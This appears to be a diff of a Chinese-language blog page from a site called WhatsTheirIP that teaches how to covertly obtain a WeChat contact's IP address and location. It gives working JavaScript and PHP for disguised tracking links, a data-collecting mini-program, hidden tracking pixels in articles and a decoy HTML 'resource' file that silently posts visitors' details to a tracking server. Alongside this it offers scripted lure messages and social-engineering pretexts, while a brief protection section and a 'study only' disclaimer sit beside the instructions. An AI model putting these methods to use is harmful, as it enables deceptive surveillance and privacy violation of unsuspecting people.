@@ -1,194 +1,384 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>微信聊天如何获取对方IP？实用技巧大揭秘 - WhatsTheirIP</title>
-    <meta name="description" content="详细介绍通过微信获取对方IP地址的实用方法，包括技术原理、操作步骤和注意事项。适合技术爱好者学习研究。">
-    <meta name="keywords" content="微信获取IP, 微信IP追踪, 聊天获取IP, 微信技术, WhatsTheirIP">
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <link rel="canonical" href="https://whatstheirip.com/blog/zh/wechat-ip-tracking-methods">
-    <meta property="og:title" content="微信聊天如何获取对方IP？实用技巧大揭秘">
-    <meta property="og:description" content="详细介绍通过微信获取对方IP地址的实用方法，包括技术原理、操作步骤和注意事项。">
-    <meta property="og:type" content="article">
-    <style>
-        .hero-section {
-            background: linear-gradient(135deg, #1AAB8A 0%, #259689 100%);
-            color: white;
-            padding: 60px 0;
-        }
-        .wechat-green { color: #1AAB8A; }
-        .method-card {
-            transition: transform 0.3s ease;
-            border: none;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-            margin-bottom: 20px;
-        }
-        .method-card:hover {
-            transform: translateY(-5px);
-        }
-        .code-block {
-            background-color: #f8f9fa;
-            border-left: 4px solid #1AAB8A;
-            padding: 15px;
-            margin: 20px 0;
-            border-radius: 5px;
-        }
-        .warning-box {
-            background-color: #fff3cd;
-            border: 1px solid #ffeaa7;
-            border-radius: 8px;
-            padding: 15px;
-            margin: 20px 0;
-        }
-        .wechat-box {
-            background: linear-gradient(135deg, #1AAB8A, #259689);
-            color: white;
-            border-radius: 10px;
-            padding: 20px;
-            margin: 20px 0;
-        }
-        .step-number {
-            background: linear-gradient(45deg, #1AAB8A, #259689);
-            color: white;
-            width: 30px;
-            height: 30px;
-            border-radius: 50%;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-            margin-right: 10px;
-        }
-        .chat-bubble {
-            background-color: #95EC69;
-            border-radius: 15px;
-            padding: 10px 15px;
-            margin: 5px 0;
-            max-width: 70%;
-        }
-        .chat-bubble.received {
-            background-color: #ffffff;
-            border: 1px solid #e0e0e0;
-        }
-    </style>
-</head>
-<body>
-    <!-- Header -->
-    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
-        <div class="container">
-            <a class="navbar-brand" href="../../index">WhatsTheirIP</a>
-            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
-                <span class="navbar-toggler-icon"></span>
-            </button>
-            <div class="collapse navbar-collapse" id="navbarNav">
-                <ul class="navbar-nav ms-auto">
-                    <li class="nav-item">
-                        <a class="nav-link" href="../../index">首页</a>
-                    </li>
-                    <li class="nav-item">
-                        <a class="nav-link" href="../index.html">博客</a>
-                    </li>
-                </ul>
-            </div>
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <title>
+   微信聊天如何获取对方IP？实用技巧大揭秘 - WhatsTheirIP
+  </title>
+  <meta content="详细介绍通过微信获取对方IP地址的实用方法，包括技术原理、操作步骤和注意事项。适合技术爱好者学习研究。" name="description"/>
+  <meta content="微信获取IP, 微信IP追踪, 聊天获取IP, 微信技术, WhatsTheirIP" name="keywords"/>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"/>
+  <link href="https://whatstheirip.com/blog/zh/wechat-ip-tracking-methods" rel="canonical"/>
+  <meta content="微信聊天如何获取对方IP？实用技巧大揭秘" property="og:title"/>
+  <meta content="详细介绍通过微信获取对方IP地址的实用方法，包括技术原理、操作步骤和注意事项。" property="og:description"/>
+  <meta content="article" property="og:type"/>
+  <style>
+   <style>
+    :root {
+      --primary-color: #4A90E2;
+      --secondary-color: #FF5733;
+      --accent-color: #FF9F1C;
+      --dark-color: #2C3E50;
+      --light-color: #ECF0F1;
+    }
+    
+    body {
+      font-family: 'Roboto', 'Microsoft YaHei', sans-serif;
+      color: var(--dark-color);
+      line-height: 1.8;
+      font-size: 16px;
+    }
+    
+    h1, h2, h3, h4, h5, h6 {
+      font-family: 'Poppins', 'Microsoft YaHei', sans-serif;
+      font-weight: 600;
+      margin-top: 2rem;
+      margin-bottom: 1rem;
+    }
+    
+    h1 {
+      font-size: 2.5rem;
+      line-height: 1.2;
+    }
+    
+    h2 {
+      font-size: 2rem;
+      color: var(--primary-color);
+    }
+    
+    h3 {
+      font-size: 1.5rem;
+    }
+    
+    .navbar {
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+    }
+    
+    .navbar-brand {
+      font-weight: 700;
+      letter-spacing: 1px;
+    }
+    
+    .article-header {
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      padding: 8rem 0 4rem;
+      color: white;
+    }
+    
+    .article-content {
+      padding: 3rem 0;
+      max-width: 900px;
+      margin: 0 auto;
+    }
+    
+    .highlight {
+      background: rgba(102, 126, 234, 0.1);
+      padding: 1.5rem;
+      border-radius: 10px;
+      margin: 1.5rem 0;
+      border-left: 4px solid var(--primary-color);
+    }
+    
+    .card {
+      background: rgba(255, 255, 255, 0.9);
+      border-radius: 15px;
+      padding: 2rem;
+      margin: 2rem 0;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+      border: 1px solid rgba(0, 0, 0, 0.05);
+    }
+    
+    .diagram-container {
+      margin: 3rem 0;
+      text-align: center;
+      background: #f8f9fa;
+      padding: 2rem;
+      border-radius: 15px;
+    }
+    
+    .diagram-container img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 10px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+    }
+    
+    .mermaid-diagram {
+      background: #f8f9fa;
+      padding: 2rem;
+      border-radius: 10px;
+      margin-top: 2rem;
+    }
+    
+    ul, ol {
+      margin: 1rem 0;
+      padding-left: 2rem;
+    }
+    
+    li {
+      margin: 0.5rem 0;
+      line-height: 1.8;
+    }
+    
+    p {
+      margin: 1rem 0;
+      line-height: 1.8;
+    }
+    
+    code {
+      background: #f4f4f4;
+      padding: 0.2rem 0.4rem;
+      border-radius: 4px;
+      font-family: 'Monaco', 'Menlo', monospace;
+      font-size: 0.9em;
+    }
+    
+    blockquote {
+      border-left: 4px solid var(--primary-color);
+      padding-left: 1rem;
+      margin: 1.5rem 0;
+      font-style: italic;
+      color: #555;
+    }
+    
+    @media (max-width: 768px) {
+      h1 { font-size: 2rem; }
+      h2 { font-size: 1.5rem; }
+      .article-content { padding: 2rem 1rem; }
+    }
+  </style>
+  <script type="module">
+   import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.esm.min.mjs';
+    mermaid.initialize({ startOnLoad: true, theme: 'default' });
+  </script>
+ </head>
+ <body>
+  <!-- Header -->
+  <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+   <div class="container">
+    <a class="navbar-brand" href="../../index">
+     WhatsTheirIP
+    </a>
+    <button class="navbar-toggler" data-bs-target="#navbarNav" data-bs-toggle="collapse" type="button">
+     <span class="navbar-toggler-icon">
+     </span>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarNav">
+     <ul class="navbar-nav ms-auto">
+      <li class="nav-item">
+       <a class="nav-link" href="../../index">
+        首页
+       </a>
+      </li>
+      <li class="nav-item">
+       <a class="nav-link" href="../index.html">
+        博客
+       </a>
+      </li>
+     </ul>
+    </div>
+   </div>
+  </nav>
+  <!-- Hero Section -->
+  <section class="hero-section">
+   <div class="container">
+    <div class="row">
+     <div class="col-lg-8 mx-auto text-center">
+      <h1 class="display-4 fw-bold mb-4">
+       💬 微信聊天如何获取对方IP？
+      </h1>
+      <p class="lead mb-4">
+       实用技巧大揭秘，教你掌握微信IP获取技术
+      </p>
+      <p class="text-light">
+       ⚠️ 仅供技术学习和研究使用
+      </p>
+      <p class="text-light">
+       <i class="bi bi-calendar">
+       </i>
+       2025年6月3日更新
+      </p>
+     </div>
+    </div>
+   </div>
+  </section>
+  <!-- Main Content -->
+  <div class="container my-5">
+   <div class="row">
+    <div class="col-lg-8 mx-auto">
+     <!-- Introduction -->
+     <section class="mb-5">
+      <div class="warning-box">
+       <h5>
+        <i class="bi bi-exclamation-triangle text-warning">
+        </i>
+        重要提醒
+       </h5>
+       <p class="mb-0">
+        本文内容仅供技术学习和网络安全研究使用。微信有严格的隐私保护机制，请遵守相关法律法规和平台规则，不得用于恶意目的。
+       </p>
+      </div>
+      <div class_="diagram-container">
+       <h4 style="margin-bottom: 1.5rem; color: #2d3748;">
+        IP追踪流程图
+       </h4>
+       <figure style="margin-bottom: 2rem;">
+        <img alt="IP追踪流程图" loading="lazy" src="../diagrams/en/how-ip-tracking-works.svg" style="max-width: 100%; height: auto; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1);"/>
+        <figcaption style="margin-top: 1rem; color: #4a5568; font-size: 0.9rem;">
+         IP追踪过程的可视化流程图
+        </figcaption>
+       </figure>
+       <div class="mermaid-diagram">
+        <h5 style="margin-bottom: 1rem; color: #2d3748;">
+         交互式流程图
+        </h5>
+        <div class="mermaid">
+         flowchart TD
+    A[用户访问网站] --&gt; B[浏览器发送请求]
+    B --&gt; C[服务器接收请求]
+    C --&gt; D[服务器记录IP地址]
+    D --&gt; E[IP地理位置查询]
+    E --&gt; F[数据收集]
+    F --&gt; G[分析处理]
+    G --&gt; H[显示结果]
+    
+    style A fill:#667eea,stroke:#764ba2,stroke-width:2px,color:#fff
+    style H fill:#48bb78,stroke:#38a169,stroke-width:2px,color:#fff
         </div>
-    </nav>
-
-    <!-- Hero Section -->
-    <section class="hero-section">
-        <div class="container">
-            <div class="row">
-                <div class="col-lg-8 mx-auto text-center">
-                    <h1 class="display-4 fw-bold mb-4">💬 微信聊天如何获取对方IP？</h1>
-                    <p class="lead mb-4">实用技巧大揭秘，教你掌握微信IP获取技术</p>
-                    <p class="text-light">⚠️ 仅供技术学习和研究使用</p>
-                    <p class="text-light"><i class="bi bi-calendar"></i> 2025年6月3日更新</p>
-                </div>
-            </div>
+       </div>
+      </div>
+      <h2>
+       微信IP获取的技术背景
+      </h2>
+      <p>
+       微信作为主流的社交应用，采用了多层的隐私保护措施。直接从微信客户端获取对方IP地址是非常困难的，因为所有通信都经过腾讯的服务器中转。但是，我们可以通过一些间接的技术手段来实现这个目标。
+      </p>
+      <div class="wechat-box">
+       <h5>
+        <i class="bi bi-chat-dots text-white">
+        </i>
+        微信通信机制解析
+       </h5>
+       <div class="row mt-3">
+        <div class="col-md-6">
+         <ul class="text-white mb-0">
+          <li>
+           <strong>
+            服务器中转
+           </strong>
+           ：所有消息通过腾讯服务器
+          </li>
+          <li>
+           <strong>
+            加密传输
+           </strong>
+           ：采用TLS/SSL加密协议
+          </li>
+          <li>
+           <strong>
+            IP隐藏
+           </strong>
+           ：真实IP被服务器IP替代
+          </li>
+         </ul>
         </div>
-    </section>
-
-    <!-- Main Content -->
-    <div class="container my-5">
-        <div class="row">
-            <div class="col-lg-8 mx-auto">
-                <!-- Introduction -->
-                <section class="mb-5">
-                    <div class="warning-box">
-                        <h5><i class="bi bi-exclamation-triangle text-warning"></i> 重要提醒</h5>
-                        <p class="mb-0">本文内容仅供技术学习和网络安全研究使用。微信有严格的隐私保护机制，请遵守相关法律法规和平台规则，不得用于恶意目的。</p>
-                    </div>
-
-                    <h2>微信IP获取的技术背景</h2>
-                    <p>微信作为主流的社交应用，采用了多层的隐私保护措施。直接从微信客户端获取对方IP地址是非常困难的，因为所有通信都经过腾讯的服务器中转。但是，我们可以通过一些间接的技术手段来实现这个目标。</p>
-                    
-                    <div class="wechat-box">
-                        <h5><i class="bi bi-chat-dots text-white"></i> 微信通信机制解析</h5>
-                        <div class="row mt-3">
-                            <div class="col-md-6">
-                                <ul class="text-white mb-0">
-                                    <li><strong>服务器中转</strong>：所有消息通过腾讯服务器</li>
-                                    <li><strong>加密传输</strong>：采用TLS/SSL加密协议</li>
-                                    <li><strong>IP隐藏</strong>：真实IP被服务器IP替代</li>
-                                </ul>
-                            </div>
-                            <div class="col-md-6">
-                                <ul class="text-white mb-0">
-                                    <li><strong>设备识别</strong>：通过设备ID进行识别</li>
-                                    <li><strong>位置隐私</strong>：GPS信息需要授权</li>
-                                    <li><strong>网络代理</strong>：可能使用CDN加速</li>
-                                </ul>
-                            </div>
-                        </div>
-                    </div>
-                </section>
-
-                <!-- Method 1 -->
-                <section class="mb-5">
-                    <h2>方法一：分享WhatsTheirIP追踪链接</h2>
-                    <div class="method-card card">
-                        <div class="card-body">
-                            <h5 class="card-title wechat-green">🌟 成功率：★★★★☆</h5>
-                            <p class="card-text">通过在微信中分享经过包装的追踪链接，当对方点击时获取其IP信息。</p>
-                            
-                            <h6 class="mt-4">实施步骤：</h6>
-                            <div class="d-flex align-items-center mb-2">
-                                <span class="step-number">1</span>
-                                <span>在WhatsTheirIP平台创建追踪链接</span>
-                            </div>
-                            <div class="d-flex align-items-center mb-2">
-                                <span class="step-number">2</span>
-                                <span>包装成有趣或有用的内容</span>
-                            </div>
-                            <div class="d-flex align-items-center mb-2">
-                                <span class="step-number">3</span>
-                                <span>在微信中自然地分享给对方</span>
-                            </div>
-                            <div class="d-flex align-items-center mb-2">
-                                <span class="step-number">4</span>
-                                <span>等待对方点击并查看结果</span>
-                            </div>
-
-                            <h6 class="mt-4">微信聊天示例：</h6>
-                            <div class="bg-light p-3 rounded">
-                                <div class="chat-bubble">
-                                    哇！我刚发现一个超好玩的在线测试 🎮
-                                </div>
-                                <div class="chat-bubble">
-                                    可以测出你的隐藏性格，准确率90%以上！
-                                </div>
-                                <div class="chat-bubble">
-                                    https://short.ly/personality-test-2025
-                                </div>
-                                <div class="chat-bubble received ms-auto">
-                                    哈哈好的，我试试看！
-                                </div>
-                            </div>
-
-                            <div class="code-block mt-3">
-                                <h6>创建微信适用的追踪链接：</h6>
-                                <pre><code>// 创建适合微信的追踪链接
-const createWeChatTrackingLink = async (originalUrl, customTitle) => {
+        <div class="col-md-6">
+         <ul class="text-white mb-0">
+          <li>
+           <strong>
+            设备识别
+           </strong>
+           ：通过设备ID进行识别
+          </li>
+          <li>
+           <strong>
+            位置隐私
+           </strong>
+           ：GPS信息需要授权
+          </li>
+          <li>
+           <strong>
+            网络代理
+           </strong>
+           ：可能使用CDN加速
+          </li>
+         </ul>
+        </div>
+       </div>
+      </div>
+     </section>
+     <!-- Method 1 -->
+     <section class="mb-5">
+      <h2>
+       方法一：分享WhatsTheirIP追踪链接
+      </h2>
+      <div class="method-card card">
+       <div class="card-body">
+        <h5 class="card-title wechat-green">
+         🌟 成功率：★★★★☆
+        </h5>
+        <p class="card-text">
+         通过在微信中分享经过包装的追踪链接，当对方点击时获取其IP信息。
+        </p>
+        <h6 class="mt-4">
+         实施步骤：
+        </h6>
+        <div class="d-flex align-items-center mb-2">
+         <span class="step-number">
+          1
+         </span>
+         <span>
+          在WhatsTheirIP平台创建追踪链接
+         </span>
+        </div>
+        <div class="d-flex align-items-center mb-2">
+         <span class="step-number">
+          2
+         </span>
+         <span>
+          包装成有趣或有用的内容
+         </span>
+        </div>
+        <div class="d-flex align-items-center mb-2">
+         <span class="step-number">
+          3
+         </span>
+         <span>
+          在微信中自然地分享给对方
+         </span>
+        </div>
+        <div class="d-flex align-items-center mb-2">
+         <span class="step-number">
+          4
+         </span>
+         <span>
+          等待对方点击并查看结果
+         </span>
+        </div>
+        <h6 class="mt-4">
+         微信聊天示例：
+        </h6>
+        <div class="bg-light p-3 rounded">
+         <div class="chat-bubble">
+          哇！我刚发现一个超好玩的在线测试 🎮
+         </div>
+         <div class="chat-bubble">
+          可以测出你的隐藏性格，准确率90%以上！
+         </div>
+         <div class="chat-bubble">
+          https://short.ly/personality-test-2025
+         </div>
+         <div class="chat-bubble received ms-auto">
+          哈哈好的，我试试看！
+         </div>
+        </div>
+        <div class="code-block mt-3">
+         <h6>
+          创建微信适用的追踪链接：
+         </h6>
+         <pre><code>// 创建适合微信的追踪链接
+const createWeChatTrackingLink = async (originalUrl, customTitle) =&gt; {
     const trackingData = {
         url: originalUrl,
         title: customTitle,
@@ -212,22 +402,28 @@ const trackingLink = await createWeChatTrackingLink(
 );
 
 console.log('微信分享链接：', trackingLink);</code></pre>
-                            </div>
-                        </div>
-                    </div>
-                </section>
-
-                <!-- Method 2 -->
-                <section class="mb-5">
-                    <h2>方法二：微信小程序IP收集</h2>
-                    <div class="method-card card">
-                        <div class="card-body">
-                            <h5 class="card-title wechat-green">🔧 技术难度：高</h5>
-                            <p class="card-text">开发微信小程序，普通用户无需API接口获取网络信息。</p>
-                            
-                            <div class="code-block">
-                                <h6>微信小程序获取网络信息：</h6>
-                                <pre><code>// 微信小程序 app.js
+        </div>
+       </div>
+      </div>
+     </section>
+     <!-- Method 2 -->
+     <section class="mb-5">
+      <h2>
+       方法二：微信小程序IP收集
+      </h2>
+      <div class="method-card card">
+       <div class="card-body">
+        <h5 class="card-title wechat-green">
+         🔧 技术难度：高
+        </h5>
+        <p class="card-text">
+         开发微信小程序，普通用户无需API接口获取网络信息。
+        </p>
+        <div class="code-block">
+         <h6>
+          微信小程序获取网络信息：
+         </h6>
+         <pre><code>// 微信小程序 app.js
 App({
     onLaunch: function () {
         this.getUserNetworkInfo();
@@ -236,7 +432,7 @@ App({
     getUserNetworkInfo: function() {
         // 获取网络类型
         wx.getNetworkType({
-            success: (res) => {
+            success: (res) =&gt; {
                 console.log('网络类型：', res.networkType);
                 this.reportNetworkInfo(res.networkType);
             }
@@ -244,7 +440,7 @@ App({
         
         // 获取系统信息
         wx.getSystemInfo({
-            success: (res) => {
+            success: (res) =&gt; {
                 const deviceInfo = {
                     brand: res.brand,
                     model: res.model,
@@ -284,11 +480,12 @@ App({
         });
     }
 });</code></pre>
-                            </div>
-
-                            <div class="code-block">
-                                <h6>服务器端IP收集处理：</h6>
-                                <pre><code>&lt;?php
+        </div>
+        <div class="code-block">
+         <h6>
+          服务器端IP收集处理：
+         </h6>
+         <pre><code>&lt;?php
 // collect-wechat-info.php
 header('Content-Type: application/json');
 header('Access-Control-Allow-Origin: *');
@@ -325,12 +522,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $input = json_decode(file_get_contents('php://input'), true);
     
     $data = [
-        'ip' => getWeChatUserIP(),
-        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
-        'network_type' => $input['network_type'] ?? '',
-        'timestamp' => date('Y-m-d H:i:s'),
-        'platform' => 'wechat',
-        'referer' => $_SERVER['HTTP_REFERER'] ?? ''
+        'ip' =&gt; getWeChatUserIP(),
+        'user_agent' =&gt; $_SERVER['HTTP_USER_AGENT'] ?? '',
+        'network_type' =&gt; $input['network_type'] ?? '',
+        'timestamp' =&gt; date('Y-m-d H:i:s'),
+        'platform' =&gt; 'wechat',
+        'referer' =&gt; $_SERVER['HTTP_REFERER'] ?? ''
     ];
     
     // 获取IP地理位置信息
@@ -343,47 +540,74 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     
     // 保存到数据库
     $pdo = new PDO("mysql:host=localhost;dbname=wechat_tracking", $user, $pass);
-    $stmt = $pdo->prepare("
+    $stmt = $pdo-&gt;prepare("
         INSERT INTO wechat_ip_logs 
         (ip, user_agent, network_type, timestamp, platform, country, city, isp) 
         VALUES (?, ?, ?, ?, ?, ?, ?, ?)
     ");
     
-    $stmt->execute([
+    $stmt-&gt;execute([
         $data['ip'], $data['user_agent'], $data['network_type'], 
         $data['timestamp'], $data['platform'], $data['country'], 
         $data['city'], $data['isp']
     ]);
     
-    echo json_encode(['status' => 'success', 'message' => '数据收集成功']);
+    echo json_encode(['status' =&gt; 'success', 'message' =&gt; '数据收集成功']);
 } else {
-    echo json_encode(['status' => 'error', 'message' => '请使用POST方法']);
+    echo json_encode(['status' =&gt; 'error', 'message' =&gt; '请使用POST方法']);
 }
 ?&gt;</code></pre>
-                            </div>
-                        </div>
-                    </div>
-                </section>
-
-                <!-- Method 3 -->
-                <section class="mb-5">
-                    <h2>方法三：微信公众号文章追踪</h2>
-                    <div class="method-card card">
-                        <div class="card-body">
-                            <h5 class="card-title wechat-green">📱 适用范围：广</h5>
-                            <p class="card-text">通过微信公众号文章嵌入追踪代码，当对方阅读文章时收集IP信息。</p>
-                            
-                            <h6 class="mt-4">实施策略：</h6>
-                            <ul>
-                                <li><strong>热门话题</strong>：写关于当前热点的文章</li>
-                                <li><strong>实用工具</strong>：提供有价值的工具或资源</li>
-                                <li><strong>个人分享</strong>：分享有趣的个人经历</li>
-                                <li><strong>专业知识</strong>：分享专业领域的干货</li>
-                            </ul>
-
-                            <div class="code-block">
-                                <h6>公众号文章追踪代码：</h6>
-                                <pre><code>&lt;!-- 在公众号文章中嵌入的追踪代码 --&gt;
+        </div>
+       </div>
+      </div>
+     </section>
+     <!-- Method 3 -->
+     <section class="mb-5">
+      <h2>
+       方法三：微信公众号文章追踪
+      </h2>
+      <div class="method-card card">
+       <div class="card-body">
+        <h5 class="card-title wechat-green">
+         📱 适用范围：广
+        </h5>
+        <p class="card-text">
+         通过微信公众号文章嵌入追踪代码，当对方阅读文章时收集IP信息。
+        </p>
+        <h6 class="mt-4">
+         实施策略：
+        </h6>
+        <ul>
+         <li>
+          <strong>
+           热门话题
+          </strong>
+          ：写关于当前热点的文章
+         </li>
+         <li>
+          <strong>
+           实用工具
+          </strong>
+          ：提供有价值的工具或资源
+         </li>
+         <li>
+          <strong>
+           个人分享
+          </strong>
+          ：分享有趣的个人经历
+         </li>
+         <li>
+          <strong>
+           专业知识
+          </strong>
+          ：分享专业领域的干货
+         </li>
+        </ul>
+        <div class="code-block">
+         <h6>
+          公众号文章追踪代码：
+         </h6>
+         <pre><code>&lt;!-- 在公众号文章中嵌入的追踪代码 --&gt;
 &lt;script&gt;
 (function() {
     // 收集基本信息
@@ -414,7 +638,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     }
     
     // 发送数据到服务器
-    const sendData = async () => {
+    const sendData = async () =&gt; {
         try {
             await fetch('https://your-tracking-server.com/wechat-article-track', {
                 method: 'POST',
@@ -454,46 +678,74 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 &lt;!-- 追踪像素图片 --&gt;
 &lt;img src="https://grabify.icu/track/wechat-article-{unique_id}?format=pixel" 
      width="1" height="1" style="display:none;" alt=""&gt;</code></pre>
-                            </div>
-
-                            <h6 class="mt-4">微信分享话术示例：</h6>
-                            <div class="bg-light p-3 rounded">
-                                <div class="chat-bubble">
-                                    刚看到一篇很有意思的文章 📖
-                                </div>
-                                <div class="chat-bubble">
-                                    《2025年最值得学习的10个技能》
-                                </div>
-                                <div class="chat-bubble">
-                                    里面提到的几个观点很有启发，推荐给你看看
-                                </div>
-                                <div class="chat-bubble received ms-auto">
-                                    好的，谢谢分享！
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </section>
-
-                <!-- Method 4 -->
-                <section class="mb-5">
-                    <h2>方法四：微信群文件追踪</h2>
-                    <div class="method-card card">
-                        <div class="card-body">
-                            <h5 class="card-title wechat-green">📁 隐蔽性：高</h5>
-                            <p class="card-text">通过在微信群中分享包含追踪代码的文件，当群友下载或查看时获取IP信息。</p>
-                            
-                            <h6 class="mt-4">可用文件类型：</h6>
-                            <ul>
-                                <li><strong>PDF文档</strong>：学习资料、工作文档</li>
-                                <li><strong>Word文档</strong>：模板、简历格式</li>
-                                <li><strong>图片文件</strong>：表情包、壁纸</li>
-                                <li><strong>压缩包</strong>：软件工具、资源合集</li>
-                            </ul>
-
-                            <div class="code-block">
-                                <h6>创建带追踪的HTML文件：</h6>
-                                <pre><code>&lt;!-- wechat-resource.html --&gt;
+        </div>
+        <h6 class="mt-4">
+         微信分享话术示例：
+        </h6>
+        <div class="bg-light p-3 rounded">
+         <div class="chat-bubble">
+          刚看到一篇很有意思的文章 📖
+         </div>
+         <div class="chat-bubble">
+          《2025年最值得学习的10个技能》
+         </div>
+         <div class="chat-bubble">
+          里面提到的几个观点很有启发，推荐给你看看
+         </div>
+         <div class="chat-bubble received ms-auto">
+          好的，谢谢分享！
+         </div>
+        </div>
+       </div>
+      </div>
+     </section>
+     <!-- Method 4 -->
+     <section class="mb-5">
+      <h2>
+       方法四：微信群文件追踪
+      </h2>
+      <div class="method-card card">
+       <div class="card-body">
+        <h5 class="card-title wechat-green">
+         📁 隐蔽性：高
+        </h5>
+        <p class="card-text">
+         通过在微信群中分享包含追踪代码的文件，当群友下载或查看时获取IP信息。
+        </p>
+        <h6 class="mt-4">
+         可用文件类型：
+        </h6>
+        <ul>
+         <li>
+          <strong>
+           PDF文档
+          </strong>
+          ：学习资料、工作文档
+         </li>
+         <li>
+          <strong>
+           Word文档
+          </strong>
+          ：模板、简历格式
+         </li>
+         <li>
+          <strong>
+           图片文件
+          </strong>
+          ：表情包、壁纸
+         </li>
+         <li>
+          <strong>
+           压缩包
+          </strong>
+          ：软件工具、资源合集
+         </li>
+        </ul>
+        <div class="code-block">
+         <h6>
+          创建带追踪的HTML文件：
+         </h6>
+         <pre><code>&lt;!-- wechat-resource.html --&gt;
 &lt;!DOCTYPE html&gt;
 &lt;html lang="zh-CN"&gt;
 &lt;head&gt;
@@ -586,7 +838,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(userInfo)
-        }).catch(() => {});
+        }).catch(() =&gt; {});
     })();
     
     function trackDownload(resourceType) {
@@ -601,7 +853,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(downloadInfo)
-        }).catch(() => {});
+        }).catch(() =&gt; {});
         
         // 模拟下载
         alert('资源准备中，请稍候...');
@@ -613,94 +865,148 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
          width="1" height="1" style="position:absolute;visibility:hidden;"&gt;
 &lt;/body&gt;
 &lt;/html&gt;</code></pre>
-                            </div>
-                        </div>
-                    </div>
-                </section>
-
-                <!-- Method 5 -->
-                <section class="mb-5">
-                    <h2>方法五：社交工程结合技术手段</h2>
-                    <div class="method-card card">
-                        <div class="card-body">
-                            <h5 class="card-title text-warning">⚠️ 需要高度谨慎</h5>
-                            <p class="card-text">通过巧妙的社交工程技巧，结合技术手段来获取对方IP信息。</p>
-                            
-                            <h6 class="mt-4">常用社交工程策略：</h6>
-                            <div class="row g-3">
-                                <div class="col-md-6">
-                                    <div class="card">
-                                        <div class="card-body">
-                                            <h6 class="card-title">🎯 兴趣导向</h6>
-                                            <p class="card-text small">根据对方兴趣爱好分享相关链接</p>
-                                        </div>
-                                    </div>
-                                </div>
-                                <div class="col-md-6">
-                                    <div class="card">
-                                        <div class="card-body">
-                                            <h6 class="card-title">📈 热点话题</h6>
-                                            <p class="card-text small">利用当前热门事件制造话题</p>
-                                        </div>
-                                    </div>
-                                </div>
-                                <div class="col-md-6">
-                                    <div class="card">
-                                        <div class="card-body">
-                                            <h6 class="card-title">🎁 福利诱导</h6>
-                                            <p class="card-text small">提供免费资源或优惠信息</p>
-                                        </div>
-                                    </div>
-                                </div>
-                                <div class="col-md-6">
-                                    <div class="card">
-                                        <div class="card-body">
-                                            <h6 class="card-title">🆘 求助模式</h6>
-                                            <p class="card-text small">以求助的方式请对方帮忙</p>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-
-                            <h6 class="mt-4">高级话术示例：</h6>
-                            <div class="bg-light p-3 rounded">
-                                <div class="chat-bubble">
-                                    哈哈，刚才看到一个超有意思的测试 😄
-                                </div>
-                                <div class="chat-bubble">
-                                    能测出你最适合什么工作，我测出来是产品经理
-                                </div>
-                                <div class="chat-bubble">
-                                    你来试试看你是什么？我猜你可能是设计师类型的
-                                </div>
-                                <div class="chat-bubble">
-                                    https://career-test.example.com/test?ref=friend
-                                </div>
-                                <div class="chat-bubble received ms-auto">
-                                    哇真的吗？让我试试！
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </section>
-
-                <!-- Detection and Prevention -->
-                <section class="mb-5">
-                    <h2>如何防止被获取IP？</h2>
-                    <div class="warning-box">
-                        <h5><i class="bi bi-shield-exclamation text-warning"></i> 防护措施</h5>
-                        <ul>
-                            <li><strong>谨慎点击链接</strong>：特别是来源不明的链接</li>
-                            <li><strong>使用VPN服务</strong>：隐藏真实IP地址</li>
-                            <li><strong>检查链接真实性</strong>：使用短链接展开工具</li>
-                            <li><strong>关闭图片自动加载</strong>：避免追踪像素</li>
-                            <li><strong>使用代理浏览器</strong>：增加匿名性</li>
-                        </ul>
-                    </div>
-
-                    <div class="code-block">
-                        <h6>简单的链接安全检查脚本：</h6>
-                        <pre><code>// 微信链接安全检查
+        </div>
+       </div>
+      </div>
+     </section>
+     <!-- Method 5 -->
+     <section class="mb-5">
+      <h2>
+       方法五：社交工程结合技术手段
+      </h2>
+      <div class="method-card card">
+       <div class="card-body">
+        <h5 class="card-title text-warning">
+         ⚠️ 需要高度谨慎
+        </h5>
+        <p class="card-text">
+         通过巧妙的社交工程技巧，结合技术手段来获取对方IP信息。
+        </p>
+        <h6 class="mt-4">
+         常用社交工程策略：
+        </h6>
+        <div class="row g-3">
+         <div class="col-md-6">
+          <div class="card">
+           <div class="card-body">
+            <h6 class="card-title">
+             🎯 兴趣导向
+            </h6>
+            <p class="card-text small">
+             根据对方兴趣爱好分享相关链接
+            </p>
+           </div>
+          </div>
+         </div>
+         <div class="col-md-6">
+          <div class="card">
+           <div class="card-body">
+            <h6 class="card-title">
+             📈 热点话题
